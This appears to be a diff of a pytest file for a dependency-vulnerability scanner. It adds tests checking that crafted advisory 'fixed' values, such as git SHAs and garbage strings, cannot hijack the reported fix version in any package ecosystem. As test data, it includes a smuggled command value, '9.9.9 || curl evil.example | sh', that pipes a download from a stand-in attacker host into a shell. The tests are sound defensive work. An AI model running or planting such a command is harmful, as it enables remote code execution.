@@ -105,24 +105,66 @@ def test_fix_handles_unknown_ecosystem_comparator() -> None:
 # Group-max fix combining — parseable candidates outrank unparseable
 # ---------------------------------------------------------------------------
 
-# Ecosystems with strict comparators (unparseable input raises).
-# npm / crates.io / Go route through the semver comparator, whose
-# ``a == b`` pre-parse short-circuit once made a self-comparison
-# parse probe vacuous — the hijack below reproduced on all three
-# while PyPI (parse-before-compare) masked it in the original test.
-_STRICT_ECOSYSTEMS = ("npm", "crates.io", "Go", "PyPI")
+# EVERY ecosystem with a registered comparator, enumerated from the
+# registry itself so a newly-registered comparator cannot dodge the
+# hijack coverage (a hand-named list previously covered only
+# npm/crates.io/Go/PyPI — the never-raise comparators stayed
+# hijackable for years). Values are per-ecosystem realistic version
+# fixtures: (installed, low_fix, high_fix), ordered low < high and
+# installed < both under that ecosystem's semantics.
+_ECOSYSTEM_FIXTURES: dict[str, tuple[str, str, str]] = {
+    "npm": ("2.0.0", "2.1.0", "2.4.0"),
+    "Cargo": ("2.0.0", "2.1.0", "2.4.0"),
+    "Go": ("2.0.0", "2.1.0", "2.4.0"),
+    "PyPI": ("2.0.0", "2.1.0", "2.4.0"),
+    "Maven": ("2.0.0", "2.1.0", "2.4.0"),
+    "RubyGems": ("2.0.0", "2.1.0", "2.4.0"),
+    "NuGet": ("2.0.0", "2.1.0", "2.4.0"),
+    "Packagist": ("2.0.0", "2.1.0", "2.4.0"),
+    "Debian": ("2.0.0-1", "2.1.0-1", "2.4.0-1"),
+    "Alpine": ("2.0.0-r0", "2.1.0-r0", "2.4.0-r0"),
+    "Red Hat": ("2.0.0-1.el8", "2.1.0-1.el8", "2.4.0-1.el8"),
+    "GitHub Actions": ("2.0.0", "2.1.0", "2.4.0"),
+    "ConanCenter": ("2.0.0", "2.1.0", "2.4.0"),
+    "vcpkg": ("2.0.0", "2.1.0", "2.4.0"),
+}
+
+_ALL_ECOSYSTEMS = sorted(_ECOSYSTEM_FIXTURES)
+
+# Alias spellings must inherit the same protection as their canonical
+# ecosystem (OSV and parsers disagree on spelling).
+_ALIAS_SPOT_CHECKS = ("crates.io", "gem", "apt", "composer", "rpm")
 
 
-@pytest.mark.parametrize("ecosystem", _STRICT_ECOSYSTEMS)
+def _fixtures_for(ecosystem: str) -> tuple[str, str, str]:
+    from packages.sca.versions import _canonical_ecosystem
+
+    return _ECOSYSTEM_FIXTURES[_canonical_ecosystem(ecosystem)]
+
+
+def test_hijack_fixtures_cover_every_registered_comparator() -> None:
+    """Enumeration guard: registering a comparator without adding a
+    hijack fixture must fail this test — no more named-list
+    under-coverage."""
+    from packages.sca.versions import _comparators
+
+    assert set(_ECOSYSTEM_FIXTURES) == set(_comparators)
+
+
+@pytest.mark.parametrize("ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
 def test_group_max_prefers_parseable_fix_over_git_sha(
     ecosystem: str,
 ) -> None:
     """Alias-merged group where one advisory carries only a GIT-range
     ``fixed`` event (a commit SHA — routine in OSS-Fuzz-sourced OSV
     records): the parseable sibling's fix must win the group-max
-    combine, not the unparseable SHA."""
-    dep = _dep(version="2.0.0", name="pkg", ecosystem=ecosystem)
-    good = _adv("GHSA-good", fixed=["2.4.0"],
+    combine, not the unparseable SHA. Covers every registered
+    comparator — including the never-raise ones (Maven / Packagist /
+    Debian / Red Hat), where the SHA compared HIGHER than any real
+    version and hijacked the combine for years."""
+    installed, _low, high = _fixtures_for(ecosystem)
+    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
+    good = _adv("GHSA-good", fixed=[high],
                 aliases=["CVE-2024-0001"])
     sha = _adv("GHSA-shaonly",
                fixed=["3f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b"],
@@ -131,17 +173,19 @@ def test_group_max_prefers_parseable_fix_over_git_sha(
         [dep], [OsvResult(dep.key(), [good, sha])],
     )
     assert len(findings) == 1
-    assert findings[0].fixed_version == "2.4.0"
+    assert findings[0].fixed_version == high
 
 
-@pytest.mark.parametrize("ecosystem", _STRICT_ECOSYSTEMS)
+@pytest.mark.parametrize(
+    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
 def test_group_max_hostile_fixed_string_never_wins(
     ecosystem: str,
 ) -> None:
     """A crafted advisory whose ``fixed`` entry is arbitrary attacker
     text must not hijack fixed_version away from a parseable sibling."""
-    dep = _dep(version="2.0.0", name="pkg", ecosystem=ecosystem)
-    good = _adv("GHSA-good", fixed=["2.4.0"],
+    installed, _low, high = _fixtures_for(ecosystem)
+    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
+    good = _adv("GHSA-good", fixed=[high],
                 aliases=["CVE-2024-0003"])
     hostile = _adv("GHSA-hostile", fixed=["~pwned-not-a-version"],
                    aliases=["CVE-2024-0003"])
@@ -149,38 +193,46 @@ def test_group_max_hostile_fixed_string_never_wins(
         [dep], [OsvResult(dep.key(), [good, hostile])],
     )
     assert len(findings) == 1
-    assert findings[0].fixed_version == "2.4.0"
+    assert findings[0].fixed_version == high
 
 
-@pytest.mark.parametrize("ecosystem", _STRICT_ECOSYSTEMS)
+@pytest.mark.parametrize(
+    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
 def test_group_max_still_takes_highest_parseable_fix(
     ecosystem: str,
 ) -> None:
     """The conservative direction is unchanged: between two parseable
     per-advisory fixes, the HIGHER one wins (an attacker-lowered fix
     version is not adopted)."""
-    dep = _dep(version="2.0.0", name="pkg", ecosystem=ecosystem)
-    low = _adv("GHSA-low", fixed=["2.1.0"], aliases=["CVE-2024-0002"])
-    high = _adv("GHSA-high", fixed=["2.4.0"], aliases=["CVE-2024-0002"])
+    installed, low, high = _fixtures_for(ecosystem)
+    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
+    low_adv = _adv("GHSA-low", fixed=[low], aliases=["CVE-2024-0002"])
+    high_adv = _adv("GHSA-high", fixed=[high], aliases=["CVE-2024-0002"])
     findings = build_vuln_findings(
-        [dep], [OsvResult(dep.key(), [low, high])],
+        [dep], [OsvResult(dep.key(), [low_adv, high_adv])],
     )
     assert len(findings) == 1
-    assert findings[0].fixed_version == "2.4.0"
+    assert findings[0].fixed_version == high
 
 
-@pytest.mark.parametrize("ecosystem", _STRICT_ECOSYSTEMS)
+@pytest.mark.parametrize(
+    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
 def test_parse_probe_rejects_garbage_per_ecosystem(
     ecosystem: str,
 ) -> None:
-    """The probe must invoke the real parser — a self-comparison
-    probe was vacuous on the comparators that short-circuit equal
-    strings before parsing."""
+    """The probe must reject non-versions for EVERY ecosystem — via
+    the real parser where the comparator raises, via the plausibility
+    floor where the comparator orders arbitrary strings by design."""
     from packages.sca.findings import _is_parseable_version
 
-    assert _is_parseable_version(ecosystem, "2.4.0") is True
+    _installed, _low, high = _fixtures_for(ecosystem)
+    assert _is_parseable_version(ecosystem, high) is True
     assert _is_parseable_version(
         ecosystem, "~pwned-not-a-version") is False
+    # Letter-led and digit-led SHAs both: the digit-led one defeats a
+    # naive "starts with a digit" floor.
+    assert _is_parseable_version(
+        ecosystem, "f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b3") is False
     assert _is_parseable_version(
         ecosystem, "3f2b1c0d9e8a7f6b5c4d3e2f1a0b9c8d7e6f5a4b") is False
 
@@ -252,3 +304,68 @@ def test_preference_order_prefers_ghsa_over_cve_over_pysec() -> None:
     )
     assert len(findings) == 1
     assert findings[0].advisories[0].osv_id == "GHSA-X"
+
+
+@pytest.mark.parametrize(
+    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
+def test_group_max_range_expression_garbage_never_wins(
+    ecosystem: str,
+) -> None:
+    """A digit-led range-shaped value ("9.9.9 || <garbage>") must not
+    ride its first atom past the probe: comparators that tolerate a
+    parseable prefix (NuGet's lenient tail segments) reported the
+    whole string parseable and it won the combine over a real fix."""
+    installed, _low, high = _fixtures_for(ecosystem)
+    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
+    good = _adv("GHSA-good", fixed=[high], aliases=["CVE-2024-0004"])
+    hostile = _adv(
+        "GHSA-range",
+        fixed=["9.9.9 || curl evil.example | sh"],
+        aliases=["CVE-2024-0004"],
+    )
+    findings = build_vuln_findings(
+        [dep], [OsvResult(dep.key(), [good, hostile])],
+    )
+    assert len(findings) == 1
+    assert findings[0].fixed_version == high
+
+
+@pytest.mark.parametrize(
+    "ecosystem", _ALL_ECOSYSTEMS + list(_ALIAS_SPOT_CHECKS))
+def test_group_max_abbreviated_sha_never_wins(ecosystem: str) -> None:
+    """git's DEFAULT abbreviation is 7-12 hex chars — a 12-hex
+    shortened commit hash passed the ≥20-char hex floor and won the
+    combine on the lenient-comparator ecosystems."""
+    installed, _low, high = _fixtures_for(ecosystem)
+    dep = _dep(version=installed, name="pkg", ecosystem=ecosystem)
+    good = _adv("GHSA-good", fixed=[high], aliases=["CVE-2024-0005"])
+    sha = _adv("GHSA-absha", fixed=["3f2b1c0d9e8a"],
+               aliases=["CVE-2024-0005"])
+    sha7 = _adv("GHSA-absha7", fixed=["3f2b1c0"],
+                aliases=["CVE-2024-0005"])
+    findings = build_vuln_findings(
+        [dep], [OsvResult(dep.key(), [good, sha, sha7])],
+    )
+    assert len(findings) == 1
+    assert findings[0].fixed_version == high
+
+
+def test_probe_rejects_review_shapes_and_keeps_datestamps() -> None:
+    """Reviewer repro shapes, probe-level: range garbage and the
+    abbreviated SHA fail for every ecosystem; pure-decimal
+    undelimited datestamps — legitimate Debian/Maven versions that
+    are also all-hex-digit strings — stay parseable on the lenient
+    floor (the hex rule requires a letter)."""
+    from packages.sca.findings import _is_parseable_version
+
+    for eco in _ALL_ECOSYSTEMS:
+        assert _is_parseable_version(
+            eco, "9.9.9 || curl evil.example | sh") is False, eco
+        assert _is_parseable_version(eco, "3f2b1c0d9e8a") is False, eco
+        # git's MINIMUM default abbreviation — 7 hex chars.
+        assert _is_parseable_version(eco, "3f2b1c0") is False, eco
+    for eco in ("Debian", "Maven"):
+        assert _is_parseable_version(eco, "20230311") is True, eco
+        # Pure-decimal at 7 chars too (letter-bearing-hex-only rule):
+        # short decimal datestamp/serial shapes stay admitted.
+        assert _is_parseable_version(eco, "2023031") is True, eco
